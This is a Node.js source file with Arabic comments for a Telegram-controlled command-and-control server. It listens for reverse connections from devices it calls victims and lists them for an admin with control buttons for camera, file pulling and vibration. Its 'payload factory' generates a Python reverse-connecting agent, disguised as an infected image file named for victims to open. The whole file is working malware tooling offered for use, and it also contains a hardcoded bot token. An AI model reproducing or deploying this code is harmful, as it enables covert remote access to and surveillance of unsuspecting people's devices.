const { Telegraf, Markup } = require('telegraf');
const net = require('net');
const fs = require('fs');

// --- إعدادات السيادة والمزامنة (مدمجة مباشرة) ---
const TOKEN = "7745042123:AAHERMo9DzTcxSQ7ZtQgF_faQAnD6BngDRw";
const ADMIN_ID = 6654753506; 
const PORT = 10000;
const HOST_URL = "your-app-name.onrender.com"; // استبدل 'your-app-name' باسم مشروعك في رندر

let activeAgents = {}; 
const bot = new Telegraf(TOKEN);

// --- 1. خادم الاستقبال العكسي (C2 Server) ---
const server = net.createServer((socket) => {
    socket.once('data', (data) => {
        try {
            const info = JSON.parse(data.toString());
            const agentId = info.hostname || `Device_${Math.floor(Math.random()*1000)}`;
            activeAgents[agentId] = { socket, info };
            
            // إشعار ذكي لمرة واحدة عند دخول الجلسة
            bot.telegram.sendMessage(ADMIN_ID, 
                `✅ **جـلسة جـديدة نـشطة!**\n\n` +
                `📱 الجهاز: ${info.hostname}\n` +
                `🔋 البطارية: ${info.battery}%\n` +
                `🖥️ النظام: ${info.platform}\n` +
                `🔌 الشحن: ${info.charging ? 'متصل' : 'غير متصل'}`, { parse_mode: 'Markdown' });
        } catch (e) { console.log("خطأ في معالجة بيانات الضحية الأولى."); }
    });

    socket.on('error', () => {});
    socket.on('close', () => {});
});
server.listen(PORT, '0.0.0.0');

// --- 2. القائمة الرئيسية (Start Menu) ---
bot.start((ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    ctx.reply('🛡️ مركز العمليات جاهز. الأوامر متاحة لك فقط:', 
        Markup.inlineKeyboard([
            [Markup.button.callback('📱 الجلسات النشطة', 'list_agents')],
            [Markup.button.callback('🛠️ أدوات التلغيم', 'payload_tools')]
        ])
    );
});

// --- 3. مصنع التلغيم التلقائي (Payload Engine) ---
bot.action('payload_tools', (ctx) => {
    ctx.answerCbQuery();
    ctx.reply('🖼️ **مـصنع التـلغيم:**\nأرسل لي الآن أي صورة (Photo) من هاتفك، وسأقوم فوراً بحقن كود الاختراق العكسي داخلها وأرسلها لك كملف جاهز.');
});

bot.on('photo', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    ctx.reply("⏳ جاري سحب بيانات الصورة وحقن كود المزامنة...");

    // كود الـ Python الذي سيتم حقنه داخل الملف الموجه للضحية
    const agentCode = `
import socket, os, platform, json, psutil, time, subprocess
def get_info():
    try:
        bat = psutil.sensors_battery()
        return {"hostname": socket.gethostname(), "platform": platform.system(), "battery": bat.percent if bat else 0, "charging": bat.power_plugged if bat else False}
    except: return {"hostname": "Unknown", "platform": platform.system(), "battery": 0, "charging": False}

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("${HOST_URL}", ${PORT}))
            s.send(json.dumps(get_info()).encode())
            while True:
                data = s.recv(1024).decode()
                if not data: break
                if "cam" in data:
                    # إضافة كود تصوير الكاميرا هنا
                    pass
                if "vibrate" in data: os.system("termux-vibrate")
            s.close()
        except: time.sleep(15)

if __name__ == "__main__":
    connect()
    `;

    const fileName = `target_image_payload.py`;
    fs.writeFileSync(fileName, agentCode);
    
    // إرسال الملف الملغم لك
    await ctx.replyWithDocument({ source: fileName, filename: 'Infected_Image_OpenMe.py' });
    ctx.reply("✅ تمت العملية! هذا الملف يحتوي على "طعم" الصورة. بمجرد أن يفتحه الضحية، ستظهر جلسته هنا فوراً.");
    fs.unlinkSync(fileName); 
});

// --- 4. أوامر التحكم بالجلسات ---
bot.action('list_agents', (ctx) => {
    ctx.answerCbQuery();
    const ids = Object.keys(activeAgents);
    if (ids.length === 0) return ctx.reply("❌ المختبر فارغ. لا توجد جلسات نشطة حالياً.");
    
    let buttons = ids.map(id => [Markup.button.callback(`🎮 تحكم: ${id} (${activeAgents[id].info.battery}%)`, `manage_${id}`)]);
    ctx.reply("🌐 الجلسات المفتوحة الآن:", Markup.inlineKeyboard(buttons));
});

bot.action(/^manage_/, (ctx) => {
    const id = ctx.match.input.split('_')[1];
    ctx.reply(`🎮 تحكم كامل في ${id}:`, 
        Markup.inlineKeyboard([
            [Markup.button.callback('📸 تصوير الكاميرا', `cmd_${id}_cam`), Markup.button.callback('📳 اهتزاز الجهاز', `cmd_${id}_vibrate`)],
            [Markup.button.callback('📂 سحب الملفات', `cmd_${id}_ls`), Markup.button.callback('🔔 إرسال إشعار', `cmd_${id}_alert`)]
        ])
    );
});

// إرسال الأوامر الفعلية للضحية
bot.action(/^cmd_/, (ctx) => {
    const parts = ctx.match.input.split('_');
    const id = parts[1];
    const cmd = parts[2];
    
    if (activeAgents[id]) {
        activeAgents[id].socket.write(cmd);
        ctx.answerCbQuery(`🚀 تم إرسال أمر: ${cmd}`);
    } else {
        ctx.reply("❌ انقطع اتصال الجلسة.");
    }
});

bot.launch();
console.log("System Online - Control Ready.");
